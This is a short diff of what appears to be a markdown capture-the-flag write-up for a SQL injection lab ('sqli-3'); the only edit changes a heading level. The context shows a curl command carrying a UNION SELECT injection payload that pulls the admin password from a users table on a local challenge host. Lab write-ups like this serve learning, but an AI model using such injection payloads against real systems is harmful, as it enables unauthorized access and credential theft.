@@ -66,7 +66,7 @@ hacker@web-security~sqli-3:~$
 
 ------------------------------------------------
 
-### From here need to find a way to use GET, as POST is not viable. Upon researching, UNION SELECT can accomplish the query payload.
+#### From here need to find a way to use GET, as POST is not viable. Upon researching, UNION SELECT can accomplish the query payload.
 
 ```
 curl -v "http://challenge.localhost:80/?query=%22UNION%20SELECT%20password%20FROM%20users%20WHERE%20username=%22admin"
